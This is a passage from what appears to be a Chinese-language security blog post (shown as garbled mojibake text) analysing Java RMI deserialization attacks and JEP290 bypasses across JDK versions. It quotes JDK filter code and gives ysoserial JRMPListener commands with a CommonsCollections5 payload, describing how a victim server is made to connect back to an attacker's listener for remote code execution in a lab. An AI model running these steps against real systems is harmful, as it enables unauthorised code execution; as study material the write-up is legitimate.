<p>æ¥ç€åˆè¯»å–äº†ä¸€ä¸ªlongå€¼ï¼Œæœ€åçš„ç»“æœå¦‚å›¾ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250112152401118.png" alt="image-20250112152401118"></p>
<p> æ¥ç€è¿›å…¥äº†DGCImpl_Skelç±»çš„dispatch(Remote var1, RemoteCall var2, int var3, long var4)ï¼Œé‚£æˆ‘ä»¬å°±å¾ˆæ¸…æ¥šäº†ï¼Œopå¯¹åº”ç€var3ï¼Œhashå¯¹åº”ç€var4ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250112123213392.png" alt="image-20250112123213392"></p>
<p>å› æ­¤è¿›å…¥switchçš„case1åˆ†æ”¯ï¼Œè¿™é‡Œå°±ä¼šå¯¹exploit&#x2F;JRMPClientå‘é€çš„æ¶æ„payloadè¿›è¡Œååºåˆ—åŒ–ï¼Œä»è€Œæ‰§è¡Œå…¶ä¸­åŒ…å«çš„ä»»æ„å‘½ä»¤ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250112123420164.png" alt="image-20250112123420164"></p>
<p> åˆ°äº†è¿™é‡Œï¼Œæ•´ä¸ªDGCè°ƒç”¨çš„æµç¨‹ä¹Ÿèµ°å®Œäº†ï¼ŒåŒæ—¶å‘é€çš„payloadä¸­åŒ…å«çš„å‘½ä»¤ä¹Ÿæ‰§è¡Œäº†ã€‚</p>
<h1 id="JEP290"><a href="#JEP290" class="headerlink" title="JEP290"></a>JEP290</h1><p>åœ¨JEP290è§„èŒƒä¹‹åï¼Œå³JAVAç‰ˆæœ¬6u141, 7u131, 8u121ä¹‹åï¼Œä»¥ä¸Šæ”»å‡»å°±ä¸å¥æ•ˆäº†ã€‚ä¸»è¦é’ˆå¯¹Registrylmplå’ŒDGClmplï¼Œåˆ†åˆ«æ˜¯sun.rmi.registry.RegistryImpl#registryFilter</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> ObjectInputFilter.Status <span class="hljs-title function_">registryFilter</span><span class="hljs-params">(ObjectInputFilter.FilterInfo var0)</span> &#123;<br>       <span class="hljs-keyword">if</span> (registryFilter != <span class="hljs-literal">null</span>) &#123;<br>           ObjectInputFilter.<span class="hljs-type">Status</span> <span class="hljs-variable">var1</span> <span class="hljs-operator">=</span> registryFilter.checkInput(var0);<br>           <span class="hljs-keyword">if</span> (var1 != Status.UNDECIDED) &#123;<br>               <span class="hljs-keyword">return</span> var1;<br>           &#125;<br>       &#125;<br><br>       <span class="hljs-keyword">if</span> (var0.depth() &gt; <span class="hljs-number">20L</span>) &#123;<br>           <span class="hljs-keyword">return</span> Status.REJECTED;<br>       &#125; <span class="hljs-keyword">else</span> &#123;<br>           <span class="hljs-type">Class</span> <span class="hljs-variable">var2</span> <span class="hljs-operator">=</span> var0.serialClass();<br>           <span class="hljs-keyword">if</span> (var2 != <span class="hljs-literal">null</span>) &#123;<br>               <span class="hljs-comment">//ç™½åå•</span><br>               <span class="hljs-keyword">if</span> (!var2.isArray()) &#123;<br>                   <span class="hljs-keyword">return</span> String.class != var2 &amp;&amp; !Number.class.isAssignableFrom(var2) &amp;&amp; !Remote.class.isAssignableFrom(var2) &amp;&amp; !Proxy.class.isAssignableFrom(var2) &amp;&amp; !UnicastRef.class.isAssignableFrom(var2) &amp;&amp; !RMIClientSocketFactory.class.isAssignableFrom(var2) &amp;&amp; !RMIServerSocketFactory.class.isAssignableFrom(var2) &amp;&amp; !ActivationID.class.isAssignableFrom(var2) &amp;&amp; !UID.class.isAssignableFrom(var2) ? Status.REJECTED : Status.ALLOWED;<br>               &#125; <span class="hljs-keyword">else</span> &#123;<br>                   <span class="hljs-keyword">return</span> var0.arrayLength() &gt;= <span class="hljs-number">0L</span> &amp;&amp; var0.arrayLength() &gt; <span class="hljs-number">1000000L</span> ? Status.REJECTED : Status.UNDECIDED;<br>               &#125;<br>           &#125; <span class="hljs-keyword">else</span> &#123;<br>               <span class="hljs-keyword">return</span> Status.UNDECIDED;<br>           &#125;<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure>

<p>sun.rmi.transport.DGCImpl#checkInput</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> ObjectInputFilter.Status <span class="hljs-title function_">checkInput</span><span class="hljs-params">(ObjectInputFilter.FilterInfo var0)</span> &#123;<br>    <span class="hljs-keyword">if</span> (dgcFilter != <span class="hljs-literal">null</span>) &#123;<br>        ObjectInputFilter.<span class="hljs-type">Status</span> <span class="hljs-variable">var1</span> <span class="hljs-operator">=</span> dgcFilter.checkInput(var0);<br>        <span class="hljs-keyword">if</span> (var1 != Status.UNDECIDED) &#123;<br>            <span class="hljs-keyword">return</span> var1;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (var0.depth() &gt; (<span class="hljs-type">long</span>)DGC_MAX_DEPTH) &#123;<br>        <span class="hljs-keyword">return</span> Status.REJECTED;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">var2</span> <span class="hljs-operator">=</span> var0.serialClass();<br>        <span class="hljs-keyword">if</span> (var2 == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> Status.UNDECIDED;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">while</span>(var2.isArray()) &#123;<br>                <span class="hljs-keyword">if</span> (var0.arrayLength() &gt;= <span class="hljs-number">0L</span> &amp;&amp; var0.arrayLength() &gt; (<span class="hljs-type">long</span>)DGC_MAX_ARRAY_SIZE) &#123;<br>                    <span class="hljs-keyword">return</span> Status.REJECTED;<br>                &#125;<br><br>                var2 = var2.getComponentType();<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (var2.isPrimitive()) &#123;<br>                <span class="hljs-keyword">return</span> Status.ALLOWED;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">//ç™½åå•é™åˆ¶</span><br>                <span class="hljs-keyword">return</span> var2 != ObjID.class &amp;&amp; var2 != UID.class &amp;&amp; var2 != VMID.class &amp;&amp; var2 != Lease.class ? Status.REJECTED : Status.ALLOWED;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<h2 id="Bypass-JEP290"><a href="#Bypass-JEP290" class="headerlink" title="Bypass JEP290"></a>Bypass JEP290</h2><p>æ¥ä¸‹æ¥æˆ‘çš„å®éªŒç¯å¢ƒæ˜¯ 8u202ã€‚</p>
<h3 id="JRMPæœåŠ¡ç«¯æ‰“JRMPå®¢æˆ·ç«¯-ysoserial-exploit-JRMPListener"><a href="#JRMPæœåŠ¡ç«¯æ‰“JRMPå®¢æˆ·ç«¯-ysoserial-exploit-JRMPListener" class="headerlink" title="JRMPæœåŠ¡ç«¯æ‰“JRMPå®¢æˆ·ç«¯(ysoserial.exploit.JRMPListener)"></a>JRMPæœåŠ¡ç«¯æ‰“JRMPå®¢æˆ·ç«¯(ysoserial.exploit.JRMPListener)</h3><p>åœ¨<a href="https://sp4rks.xyz/2024/12/27/JAVA%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/RMI%E4%B8%93%E9%A2%98-%E6%9C%8D%E5%8A%A1%E8%B0%83%E7%94%A8%E6%B5%81%E7%A8%8B%E7%AF%87/#%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%AF%B7%E6%B1%82%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83-%E5%AE%A2%E6%88%B7%E7%AB%AF">JAVAååºåˆ—åŒ–-RMIæœåŠ¡è°ƒç”¨æµç¨‹ç¯‡</a> å®¢æˆ·ç«¯è¯·æ±‚æ³¨å†Œä¸­å¿ƒ-å®¢æˆ·ç«¯çš„æ—¶å€™æˆ‘ä»¬æåˆ°äº†<strong>sun.rmi.transport.StreamRemoteCall#executeCall</strong>æ–¹æ³•ã€‚ä¸‹é¢å°±æ˜¯åˆ©ç”¨<strong>sun.rmi.transport.StreamRemoteCall#executeCall</strong>æ–¹æ³•ã€‚</p>
<p>æˆ‘ä»¬ç°åœ¨å·²çŸ¥åœ¨å®¢æˆ·ç«¯æœ‰ä¸€ä¸ªååºåˆ—åŒ–çš„ç‚¹ï¼Œé‚£å¯¹åº”çš„æœåŠ¡ç«¯åœ¨å“ªé‡Œå¯ä»¥æ’å…¥payloadï¼Ÿ</p>
<p>å¯ä»¥çœ‹åˆ°ä¸Šé¢å®¢æˆ·ç«¯ä»£ç å¯¹äºæœåŠ¡ç«¯ä¼ è¾“è¿‡æ¥çš„<code>returnType</code>åˆ¤æ–­ä¸º<code>TransportConstants.ExceptionalReturn</code>æ‰ä¼šè¿›å…¥ååºåˆ—åŒ–æµç¨‹ã€‚é‚£ä¹ˆæˆ‘ä»¬æ¥å…¨å±€æœç´¢<code>TransportConstants.ExceptionalReturn</code>å°±å¯ä»¥æ‰¾åˆ°æœåŠ¡ç«¯åœ¨å“ªé‡Œå†™å…¥çš„äº†ã€‚</p>
<p>å‘ç°æœåŠ¡ç«¯çš„ä»£ç å°±åœ¨åŒä¸ªjavaæ–‡ä»¶ä¸‹<code>sun.rmi.transport.StreamRemoteCall#getResultStream</code>ï¼Œå½“successä¸ºfalseæ—¶ï¼Œå†™å…¥è¾“å‡ºæµã€‚</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250114151509211.png" alt="image-20250114151509211"></p>
<p>æˆ‘ä»¬æŸ¥æ‰¾ç”¨æ³•å‘ç°ä¸ºfalseçš„æƒ…å†µæœ‰ <code>java.rmi.server.RemoteCall#getResultStream</code> å’Œ <code>java.rmi.server.RemoteCall#getResultStream</code></p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250114151443901.png" alt="image-20250114151443901"></p>
<p>ä½†å…¶å®ä»–ä»¬éƒ½å†™å…¥äº†æŠ¥é”™ä¿¡æ¯ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250114163134278.png" alt="image-20250114163134278"></p>
<p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¹¶ä¸èƒ½æ§åˆ¶ä»–ä»¬çš„å†™çš„æŠ¥é”™ä¿¡æ¯ä¸º<code>TransportConstants.ExceptionalReturn</code>ã€‚</p>
<p><strong>ysoserial.exploit.JRMPListener</strong>å®ç°çš„æ–¹å¼æ˜¯è‡ªå®ç°æ‹¼æ¥å‡ºä¸€ä¸ªJRMPæœåŠ¡ç«¯ï¼Œæ¥å‘é€ç»™JRMPå®¢æˆ·ç«¯ä¸€ä¸ªåºåˆ—åŒ–æ•°æ®ã€‚</p>
<p>ç¬¬ä¸€ä¸ªçº¢æ¡†å°±æ˜¯ä»£æ›¿äº†ç”¨æˆ·è‡ªå®šä¹‰è¾“å…¥ï¼Œæˆ‘ä»¬ç›´æ¥æ‰‹åŠ¨ç”Ÿæˆ payloadObjectï¼Œéšå³å°±è¢«ä½œä¸ºå‚æ•°å¸¦å…¥äº† JRMPListener çš„æ„é€ å‡½æ•°é‡Œï¼Œæœ€åè°ƒç”¨äº† run å‡½æ•°ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250114170212320.png" alt="image-20250114170212320"></p>
<p>æˆ‘ä»¬å…ˆçœ‹çœ‹ æ„é€ å‡½æ•°ï¼ŒpayloadObject èµ‹å€¼ç»™äº† å½“å‰ç±»çš„ pyaloadObject ï¼Œéšå³å°±å¼€å¯çš„ socket æœåŠ¡ç«¯ï¼Œå‡†å¤‡å¥½æ¥è‡ª JRMPClient çš„è¿æ¥ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250114170255746.png" alt="image-20250114170255746"></p>
<p>è·Ÿè¿› run å‡½æ•°ï¼Œæˆ‘ä»¬ç›´æ¥çœ‹å¦‚æœæ˜¯æ­£å¸¸ JRMP åè®®çš„ tcp è¿æ¥ï¼Œé‚£ä¹ˆä¼šè¿›å…¥åˆ°å¦‚ä¸‹å›¾ï¼š</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250114170525478.png" alt="image-20250114170525478"></p>
<p>å…¶ä¸­é‡è¦çš„æ˜¯ doMessage å‡½æ•°ï¼Œè·Ÿè¿› doMessage å‡½æ•°ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250114170631915.png" alt="image-20250114170631915"></p>
<p>è¯»å–ä¸€ä¸ª int op ï¼Œç„¶åæ ¹æ®å…¶å€¼åšä¸åŒçš„æ“ä½œï¼Œè¿™ä¸ª TransportConstants.Call å…¶å®å°±æ˜¯ 80ï¼ŒRegistry é‡Œä¹Ÿæ˜¯ 80ï¼Œå¯ä»¥åœ¨ StreamRemoteCall çš„æ„é€ å‡½æ•°é‡Œçœ‹è§ï¼Œå®ƒå‘ server ç«¯å‘é€äº†ä¸€ä¸ª 80ã€‚ç„¶åè·Ÿè¿›doCallã€‚</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250114170740399.png" alt="image-20250114170740399"></p>
<p>å…ˆè¿”å›äº†ä¸€ä¸ª TransportConstants.ExceptionalReturn ï¼Œå…¶å€¼ä¸º 2ï¼Œä¸ºäº†æ»¡è¶³å¼‚å¸¸éœ€æ±‚ã€‚ç„¶åç”Ÿæˆäº†ä¸€ä¸ª BadAttributeValueExpException çš„å¯¹è±¡ï¼Œç„¶åå°†å…¶ val æˆå‘˜å˜é‡è®¾ç½®ä¸º payload äº†ï¼Œåªè¦æœ‰ååºåˆ—åŒ–ï¼Œé‚£ä¹ˆå°±ä¼šè§¦å‘ä»£ç æ‰§è¡Œã€‚æœ€åå°†å…¶å‘é€ç»™äº† JRMPClientã€‚</p>
<hr>
<p>ä½¿ç”¨ysoserialå¼€å¯ä¸€ä¸ªæ¶æ„æœåŠ¡å™¨</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">java -cp .\ysoserial-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 calc.exe<br></code></pre></td></tr></table></figure>

<p><img src="https://image.sp4rks.xyz/2025/01/image-20250113140719418.png" alt="image-20250113140719418"></p>
<p>æˆ‘ä»¬å®¢æˆ·ç«¯ä¸»åŠ¨è¿æ¥ï¼Œå¯ä»¥çœ‹åˆ°å³ä½¿åœ¨é«˜ç‰ˆæœ¬ä¸‹ä¾ç„¶è¿˜æ˜¯è¢«æ‰§è¡Œäº†ã€‚                                                                                                                        </p>
<p>è¿™è¯´æ˜<strong>JRMPæœåŠ¡ç«¯æ‰“JRMPå®¢æˆ·ç«¯çš„æ”»å‡»æ–¹æ³•ä¸å—JEP290çš„é™åˆ¶ï¼</strong></p>
<p>çœ‹åˆ°è¿™é‡Œæ˜¯ä¸æ˜¯å¤§æ¦‚æœ‰æ€è·¯äº†ã€‚ä¹Ÿå°±æ˜¯è¯´å¦‚æœæœåŠ¡å™¨ä¸»åŠ¨è¿æ¥ exploit&#x2F;JRMPListenï¼Œæ˜¯ä¸æ˜¯å°±å¿…ç„¶ä¼šè¢«æˆ‘ä»¬æ¼æ´åˆ©ç”¨æ”»å‡»äº†ï¼Ÿ</p>
<p><strong>å› æ­¤æˆ‘ä»¬çš„éš¾ç‚¹å°±å˜æˆäº†æ€ä¹ˆè®©å—å®³æœåŠ¡å™¨å»ä¸»åŠ¨è¿æ¥æˆ‘ä»¬çš„ exploit&#x2F;JRMPListen</strong>ã€‚<br>è¿™é‡Œæˆ‘ä»¬å†å¼•å…¥ysoserialçš„payload&#x2F;JRMPClientï¼Œåªè¦ç›®æ ‡æœåŠ¡å™¨ååºåˆ—åŒ–è¿™ä¸ªå¯¹è±¡å°±ä¼šä¸»åŠ¨è¿æ¥å¤–éƒ¨çš„ RMI æ³¨å†Œä¸­å¿ƒã€‚<br><strong>è€Œæˆ‘ä»¬çš„é—®é¢˜å°±å˜æˆäº†æ€ä¹ˆè®©ç›®æ ‡ååºåˆ—åŒ–è¿™ä¸ªå¯¹è±¡ï¼Œåœ¨ RMI çš„æ¼æ´åˆ©ç”¨ä¸­ä¹Ÿå°±æ˜¯æ€ä¹ˆè®©è¿™ä¸ªå¯¹è±¡ç»•è¿‡ JEP290 çš„ç™½åå•è¿‡æ»¤ã€‚</strong></p>
<p>è¿™ä¸€éƒ¨åˆ†å¯ä»¥çœ‹å•¦å•¦å¸ˆå‚…çš„<a href="https://xz.aliyun.com/t/7932?time__1311=n4+xnD0DyDu730KGQDCDlhjmIb4xgixWq4n+ID#toc-3">æ–‡ç« </a>ï¼Œå†™çš„å¾ˆæ¸…æ¥šã€‚</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250119164750156.png" alt="image-20250119164750156"></p>
<p><strong>é‚£ä¹ˆæœ€åçš„é—®é¢˜å°±æ˜¯æ€ä¹ˆæŠŠè¿™ä¸ªå¯¹è±¡å‘é€ç»™ç›®æ ‡å‘¢ï¼Ÿ</strong></p>
<h3 id="é€šè¿‡-Bind-å»å‘é€-Payload-JRMPClientï¼ˆ8u141-ä¹‹å‰ï¼‰"><a href="#é€šè¿‡-Bind-å»å‘é€-Payload-JRMPClientï¼ˆ8u141-ä¹‹å‰ï¼‰" class="headerlink" title="é€šè¿‡ Bind å»å‘é€ Payload&#x2F;JRMPClientï¼ˆ8u141 ä¹‹å‰ï¼‰"></a>é€šè¿‡ Bind å»å‘é€ Payload&#x2F;JRMPClientï¼ˆ8u141 ä¹‹å‰ï¼‰</h3><p>è¿™éƒ¨åˆ†æˆ‘çš„ç¯å¢ƒæ˜¯ 8u65ã€‚</p>
<ul>
<li>ç‰©ç†æœºå™¨ipï¼š192.168.66.71 ä½œä¸ºæ”»å‡»ç«¯</li>
<li>è™šæ‹Ÿæœºipï¼š192.168.112.133å¼€å¯RMIæœåŠ¡</li>
</ul>
<p>è™šæ‹Ÿæœºå®šä¹‰ä¸€ä¸ªIRemoteObjæ¥å£</p>
<p>RemoteObjimplå®ç°æ–¹æ³•ï¼Œåˆ›å»ºæ³¨å†Œä¸­å¿ƒ ï¼Œå¼€å¯RMIæœåŠ¡ï¼Œå¹¶ä¸”æœ‰commons-collectionsã€‚</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250115142323400.png" alt="image-20250115142323400"></p>
<p>æ”»å‡»ç«¯ä½¿ç”¨exploit&#x2F;JRMPListenerå¼€å¯ä¸€ä¸ªæ¶æ„çš„RMIæœåŠ¡ï¼ŒPayloadæˆ‘ç”¨çš„æ˜¯ ysoserialçš„payload&#x2F;JRMPClientï¼Œèƒ½å¤Ÿç»•è¿‡ JEP290ï¼Œç›´æ¥æ‹¿è¿‡æ¥ç”¨å°±è¡Œ</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">java -cp .\ysoserial-all.jar ysoserial.exploit.JRMPListener 1199 CommonsCollections5 calc.exe<br></code></pre></td></tr></table></figure>

<p><img src="https://image.sp4rks.xyz/2025/01/image-20250115142633366.png" alt="image-20250115142633366"></p>
<p>æœåŠ¡ç«¯æˆåŠŸè¢«RCE</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250115142814651.png" alt="image-20250115142814651"></p>
<p>æ”»å‡»æµç¨‹å¦‚ä¸‹ï¼š</p>
<ol>
<li>æ”»å‡»æ–¹åœ¨è‡ªå·±çš„æœåŠ¡å™¨ä½¿ç”¨<code>exploit/JRMPListener</code>å¼€å¯ä¸€ä¸ªrmiç›‘å¬</li>
<li>å¾€å­˜åœ¨æ¼æ´çš„æœåŠ¡å™¨å‘é€<code>payloads/JRMPClient</code>ï¼Œpayloadä¸­å·²ç»è®¾ç½®äº†æ”»å‡»è€…æœåŠ¡å™¨ipåŠJRMPListenerç›‘å¬çš„ç«¯å£ï¼Œæ¼æ´æœåŠ¡å™¨ååºåˆ—åŒ–è¯¥payloadåï¼Œä¼šå»è¿æ¥æ”»å‡»è€…å¼€å¯çš„rmiç›‘å¬ï¼Œåœ¨é€šä¿¡è¿‡ç¨‹ä¸­ï¼Œæ”»å‡»è€…æœåŠ¡å™¨ä¼šå‘é€ä¸€ä¸ªå¯æ‰§è¡Œå‘½ä»¤çš„payloadï¼ˆå‡å¦‚å­˜åœ¨æ¼æ´çš„æœåŠ¡å™¨ä¸­æœ‰ä½¿ç”¨<code>org.apacje.commons.collections</code>åŒ…ï¼Œåˆ™å¯ä»¥å‘é€<code>CommonsCollections</code>ç³»åˆ—çš„payloadï¼‰ï¼Œä»è€Œè¾¾åˆ°å‘½ä»¤æ‰§è¡Œçš„ç»“æœã€‚</li>
</ol>
<p>ç»†æƒ³è¿™ä¸ªè¿‡ç¨‹ï¼Œä¼šå‘ç°è¿™ä¸ªè¿‡ç¨‹è·Ÿfastjsonçš„JNDIæ³¨å…¥æ”»å‡»æ¨¡å¼å¾ˆç›¸ä¼¼ï¼Œç”¨ä¸€ä¸ªpayloadå»è¯±å¯¼ç›®æ ‡æœåŠ¡å™¨å‘èµ·ä¸€ä¸ªå¤–éƒ¨è¿æ¥ï¼Œè¿æ¥åˆ°æˆ‘ä»¬æ§åˆ¶çš„æ¶æ„æœåŠ¡ï¼Œæ¶æ„æœåŠ¡å†å»è¿”å›payloadä»è€Œåœ¨æœåŠ¡å™¨ä¸Šå®Œæˆå‘½ä»¤æ‰§è¡Œã€‚</p>
<p><strong>æ³¨å†Œç«¯å¯¹äºæœåŠ¡ç«¯åœ°å€æ ¡éªŒçš„å˜åŠ¨</strong></p>
<p>ä¸ºä»€ä¹ˆåœ¨8u141åè¿™ç§æ”»å‡»æ‰‹æ³•ä¸è¡Œäº†å‘¢ï¼Ÿè¿™é‡Œç›´æ¥å€Ÿç”¨å•¦å•¦å¸ˆå‚…çš„å›¾æ¥è¯´æ˜ï¼Œå…³é”®åœ¨RegistryImpl_Skelç±»ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2025/01/20200622140248-ffa63c34-b44d-1.png" alt="20200622140248-ffa63c34-b44d-1"></p>
<p>ä¹Ÿå°±æ˜¯è¯´åœ¨8u141ä¹‹å‰ï¼Œ JRMP çš„ååºåˆ—åŒ–å‘ç”Ÿåœ¨è¿™ä¸ªåœ°å€æ ¡éªŒä¹‹å‰ï¼Œå› æ­¤è¿™ä¸ªé™åˆ¶å¯¹æˆ‘ä»¬æ¥è¯´æ²¡æœ‰ä½œç”¨ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡ bind å»æŠŠè¿™ä¸ªå¯¹è±¡ç»™å‘é€ä¸ªæ³¨å†Œä¸­å¿ƒã€‚æ­¤åï¼Œåœ¨ 8u141 ä¿®å¤ä¸­å¯¹è¿™ä¸ªæ ¡éªŒæå‰äº†ï¼Œå› æ­¤é€šè¿‡ bind å»å‘ç”Ÿ payload ä¸å†å¯è¡Œã€‚</p>
<h3 id="é€šè¿‡-lookup-å»å‘é€-Payload-JRMPClientï¼ˆ8u231-ä¹‹å‰ï¼‰ï¼ˆæˆ‘çš„ç¯å¢ƒä¸ºJDK141ï¼‰"><a href="#é€šè¿‡-lookup-å»å‘é€-Payload-JRMPClientï¼ˆ8u231-ä¹‹å‰ï¼‰ï¼ˆæˆ‘çš„ç¯å¢ƒä¸ºJDK141ï¼‰" class="headerlink" title="é€šè¿‡ lookup å»å‘é€ Payload&#x2F;JRMPClientï¼ˆ8u231 ä¹‹å‰ï¼‰ï¼ˆæˆ‘çš„ç¯å¢ƒä¸ºJDK141ï¼‰"></a>é€šè¿‡ lookup å»å‘é€ Payload&#x2F;JRMPClientï¼ˆ8u231 ä¹‹å‰ï¼‰ï¼ˆæˆ‘çš„ç¯å¢ƒä¸ºJDK141ï¼‰</h3><p>ç”±äº 8u141 ä¹‹åä¿®å¤äº†æœåŠ¡æ®µå’Œæ³¨å†Œä¸­å¿ƒçš„åœ°å€æ ¡éªŒé—®é¢˜ï¼Œæ²¡åŠæ³•å†ç”¨ Bind äº†ï¼Œä½†æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨ lookup æ–¹æ³•æ¥å‘é€ JRMPClient Payloadã€‚</p>
<p>ä½†åœ¨ 8U231 ä¹‹åï¼ŒOracle å¼€å§‹å¯¹ JEP290 æ‹¦æˆªçš„ç™½åå•è¿›è¡Œå¢å¼ºä¿®å¤ï¼Œå› æ­¤æˆ‘ä»¬å°è£…çš„ JRMPClient æ— æ³•é€šè¿‡ JEP290 çš„æ‹¦æˆªäº†ã€‚</p>
<p>è¿™é‡Œé—®é¢˜åœ¨äº Lookup åªæ¥æ”¶ String ç±»å‹ï¼Œæˆ‘ä»¬éœ€è¦æƒ³åŠæ³•ï¼Œè®©æˆ‘ä»¬çš„ Lookup èƒ½æ¥æ”¶ Object å¯¹è±¡ï¼Œè¿™é‡Œè¦ä¹ˆå®ç°ä¸€ä¸ª HOOK æ‹¦æˆªå™¨ï¼Œè¦ä¹ˆé‡å†™ Lookupã€‚</p>
<p>è¿™é‡Œ ysomap è¿™ä¸ªå·¥å…·å°±é‡å†™äº† Lookupï¼Œæˆ‘ä»¬åªéœ€è¦æ‹¿è¿‡æ¥ç”¨å°±å®Œäº‹äº†ã€‚</p>
<p>ysomap.exploit.rmi.component.Naming#lookup</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250118184429570.png" alt="image-20250118184429570"></p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250118184541535.png" alt="image-20250118184541535"></p>
<h3 id="é€šè¿‡-lookup-å»å‘é€-Payload-JRMPClientï¼ˆ8u241-ä¹‹å‰ï¼‰ï¼ˆæˆ‘çš„ç¯å¢ƒä¸ºjdk231ï¼‰"><a href="#é€šè¿‡-lookup-å»å‘é€-Payload-JRMPClientï¼ˆ8u241-ä¹‹å‰ï¼‰ï¼ˆæˆ‘çš„ç¯å¢ƒä¸ºjdk231ï¼‰" class="headerlink" title="é€šè¿‡ lookup å»å‘é€ Payload&#x2F;JRMPClientï¼ˆ8u241 ä¹‹å‰ï¼‰ï¼ˆæˆ‘çš„ç¯å¢ƒä¸ºjdk231ï¼‰"></a>é€šè¿‡ lookup å»å‘é€ Payload&#x2F;JRMPClientï¼ˆ8u241 ä¹‹å‰ï¼‰ï¼ˆæˆ‘çš„ç¯å¢ƒä¸ºjdk231ï¼‰</h3><p>8u231 ä¸»è¦ä¿®å¤çš„æ˜¯</p>
<ul>
<li><p>sun.rmi.registry.RegistryImpl_Skel#dispatch æŠ¥é”™æƒ…å†µæ¶ˆé™¤ ref</p>
</li>
<li><p>sun.rmi.transport.DGCImpl_Stub#dirty æå‰äº†é»‘åå•</p>
</li>
</ul>
<p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬çš„ payload&#x2F;JRMPClient éœ€è¦æƒ³åŠæ³•é‡æ–°å°è£…ä»¥ç»•è¿‡ 8u231 çš„ä¿®å¤ã€‚è¿™é‡Œæˆ‘ä»¬åˆ©ç”¨ ysomap ä¸­å°è£…å¥½çš„å¯¹è±¡ï¼Œç„¶åè€æ ·å­é€šè¿‡ lookup ç»™æœåŠ¡å™¨ä¼ è¿›å»å³å¯ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250118191420840.png" alt="image-20250118191420840"></p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250118191444055.png" alt="image-20250118191444055"></p>
<h1 id="å‚è€ƒè¿æ¥"><a href="#å‚è€ƒè¿æ¥" class="headerlink" title="å‚è€ƒè¿æ¥"></a>å‚è€ƒè¿æ¥</h1><p><a href="https://su18.org/post/rmi-attack/#%E5%9B%9B-%E6%94%BB%E5%87%BB-rmi">Java RMI æ”»å‡»ç”±æµ…å…¥æ·±</a></p>
<p><a href="https://xz.aliyun.com/t/8706#toc-13">JAVA RMI ååºåˆ—åŒ–æ”»å‡» &amp; JEP290 Bypassåˆ†æ</a></p>
<p><a href="https://xz.aliyun.com/t/7930">é’ˆå¯¹RMIæœåŠ¡çš„ä¹é‡æ”»å‡» - ä¸Š</a></p>
<p><a href="https://xz.aliyun.com/t/7932">é’ˆå¯¹RMIæœåŠ¡çš„ä¹é‡æ”»å‡» - ä¸‹</a></p>
<p><a href="https://xz.aliyun.com/t/7079">åŸºäºJavaååºåˆ—åŒ–RCE - ææ‡‚RMIã€JRMPã€JNDI</a></p>
<p><a href="https://xz.aliyun.com/t/16723">JAVAå®‰å…¨ä¹‹RMIå‘½ä»¤æ‰§è¡Œæ·±åº¦åˆ¨æ</a></p>
<p><a href="https://goodapple.top/archives/520">Javaå®‰å…¨å­¦ä¹ â€”â€”åˆ©ç”¨RMIè¿›è¡Œæ”»å‡»</a></p>
<p><a href="https://www.anquanke.com/post/id/200860#h2-3">Bypass JEP290æ”»å‡»rmi</a></p>
<p><a href="https://ruyueattention.github.io/2022/11/09/Java%2520RMI%EF%BC%88%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">Java RMIï¼ˆè¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼‰æ¼æ´åˆ©ç”¨ - Java</a></p>
<p><a href="https://xz.aliyun.com/t/15803?time__1311=GqjxnDgDyD2DuQDlxGoRWUuexfx=WWm7eD">JRMPé€šä¿¡æ”»å‡»è¿‡ç¨‹åŠåˆ©ç”¨ä»‹ç»</a></p>
<p><a href="https://blog.csdn.net/qsort_/article/details/104874111">ysoserial exploit&#x2F;JRMPClientåŸç†å‰–æ</a></p>
<p><a href="https://blog.csdn.net/qsort_/article/details/104969138">ysoserial exploit&#x2F;JRMPListeneråŸç†å‰–æ</a></p>
